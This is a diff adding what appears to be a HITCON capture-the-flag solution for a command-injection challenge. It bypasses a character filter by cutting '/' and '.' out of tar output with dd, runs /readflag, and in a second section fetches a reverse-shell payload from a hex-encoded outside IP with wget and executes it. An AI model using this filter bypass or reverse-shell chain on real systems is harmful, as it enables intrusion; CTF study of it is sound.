@@ -1,0 +1,135 @@
+Filter:
+	; | > < \ & . ` { } - ? $
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""
+### Read flag directly (/readflag)
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+// Create a file with some strings
+id () dd of=original bs=1 count=200
+id
+// Start with ls because it is not a bad command
+ls aasdfasgfag98472rjhsnfdmzxcvstuvwxaksdljiweoquwjlqiu9293ru9d9f8z7xcvmanbqwioeuitu929ows8f8ha8sjqwepfghajsytgsuadfbsbvnzxcvnmasdashdgkhalsioqweiotqphiwgnzrghiajsdkflaksfowqeuriqugsaghkahsjgabjvzxcv
+
+// Compress
+id () tar zcvf original_tar original
+id
+
+// '/' = 0x2f
+id () xxd original_tar
+id
+
+00000000: 1f8b 0800 0000 0000 0203 edce 3b72 c420  ............;r.
+00000010: 0c06 60ea 9cc2 4700 fc3e 8ebc 9897 59b3  ..`...G..>....Y.
+00000020: 2063 363e 7d70 d267 2645 5cf9 6b34 1a7e   c6>}p.g&E\.k4.~
+00000030: 09f9 6894 59c1 917f 448b ae69 ceca 59cb  ..h.Y...D..i..Y.
+00000040: ce5a f73f fdb7 9a51 c2ea bea3 5ddb b42d  .Z.?...Q....]..-
+00000050: 2594 d1ba 6d48 45c9 0512 6e10 ab8a 30c6  %...mHE...n...0.
+00000060: c7df 729c f24b eeb9 98c3 0a00 8504 5412  ..r..K........T.
+00000070: d438 343d 8f56 e32a c5f3 783f 76dc d29e  .84=.V.*..x?v...
+00000080: dfb0 a070 d6e4 d987 94ad 0b26 8d7c ac63  ...p.......&.|.c
+00000090: 1ac5 2887 a32f b927 ac53 c8c6 cfc9 6ce7  ..(../.'.S....l.
+000000a0: a3cf 38c8 41c3 8036 e4f9 2595 068b 9f9b  ..8.A..6..%.....
+000000b0: c204 424e 38ed ebb9 7d7d 96af 01b5 508b  ..BN8...}}....P.
+000000c0: 0687 c697 acf1 5b78 6993 d57a 44a5 4d19  ......[xi..zD.M.
+000000d0: 138b 74e5 02e9 7398 5334 2129 04a5 17d0  ..t...s.S4!)....
+000000e0: 6815 4c76 3f37 7d90 dbed 76bb fdc9 1733  h.Lv?7}...v....3
+000000f0: fdc4 f700 0800 00                        .......
+
+// Create a file contains /
+id () dd if=original_tar of=payload bs=1 count=1 skip=149
+id
+du () cat payload
+du
+
+Output: /
+
+// Append readflag
+id () dd of=payload bs=1 count=8 skip=3 seek=1
+id
+ls readflag
+du
+
+Output: /readflag
+
+// Execute /readflag
+ls () sh payload
+ls
+
+Output: hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}
+
+
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""
+### Execute Reverse shell (sh index.html)
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+
+
+// Create a file with some strings
+id () dd of=original bs=1 count=256
+id
+// Start with ls because it is not a bad command
+ls aasdfasgfag98472rjhsnfdmzxcvstuvwxaksdljiweoquwjlqiu9293ru9d9f8z7xcvmanbqwioeuitu929ows8f8ha8sjqwepfghajsytgsuadfbsbvnzxcvnmasdashdgkhalsioqweiotqphiwgnzrghiajsdkflaksfowqeuriqugsaghkahsjgabjvzxcvfq3iworijaojfsdlkfnkwerhu2i83yr81grfnbsnf23t23r wggsvmcy
+
+// Compress
+id () tar zcvf original_tar original
+id
+
+// '.' = 0x2e
+id () xxd original_tar
+id
+
+00000000: 1f8b 0800 0000 0000 0203 edcf 4976 c320  ............Iv.
+00000010: 0c06 60af 7b0a 1f81 c1e3 71e4 6026 db10  ..`.{.....q.`&..
+00000020: 9031 494e 1fdc eebb 6b36 f5b7 d1e3 4988  .1IN....k6....I.
+00000030: 1f1f 8d32 0ed6 ea0f 91a2 6b9a b332 dad2  ...2......k..2..
+00000040: b3f2 fee7 fcad 21a4 a2bc ef48 d7b6 1d2f  ......!....H.../
+00000050: 7d4a 78db 5635 a93e 20e1 0eb1 ae2b 4ad9  }Jx.V5.> ....+J.
+00000060: f8db 1c23 ec23 793e 6cc5 1a00 8504 5412  ...#.#y>l.....T.
+00000070: d438 343d 8b56 a393 627b 3d6e 07ee e9c8  .84=.V..b{=n....
+00000080: 0f58 50ac d6e4 d987 94ed 1a4c 1ad9 c863  .XP........L...c
+00000090: 1ac5 2887 575f e636 7053 c8c6 cfc9 ec67  ..(.W_.6pS.....g
+000000a0: d367 1ce4 a061 401b f27c 974a 83c5 e7ae  .g...a@..|.J....
+000000b0: 3081 9013 4e87 3bb7 bbad 3c0d a885 5a34  0...N.;...<...Z4
+000000c0: ac68 7c99 357e 0f77 6db2 72af a8b4 29d7  .h|.5~.wm.r...).
+000000d0: c422 d792 40fa 1ce6 144d 480a 41e9 0534  ."..@....MH.A..4
+000000e0: 5a05 933d ce4d 3270 937d 3416 bc95 25ec  Z..=.M2p.}4...%.
+000000f0: 22dd 92e7 a813 3303 7fc6 81aa 28dd 54be  ".....3.....(.T.
+00000100: c5f8 ce78 acb3 5278 6cb7 e757 75b9 5c2e  ...x..Rxl..Wu.\.
+00000110: ffd4 1b99 24e5 7800 0800 00              ....$.x....
+
+du () cat payload2
+
+// Create a file contains 'sh index'
+id () dd of=payload2 bs=1 count=8 skip=3
+id
+ls sh index
+du
+
+Output: sh index
+
+// Append '.'
+id () dd if=original_tar of=payload2 bs=1 count=1 skip=271 seek=8
+id
+du
+
+Output: sh index.
+
+// Append html
+id () dd of=payload2 bs=1 count=4 skip=3 seek=9
+id
+ls html
+du
+
+Output: sh index.html
+
+// Get reverse shell payload in index.html
+ls () wget 0x8c71188f
+ls
+
+// Execute reverse shell
+ls () sh payload2
+ls
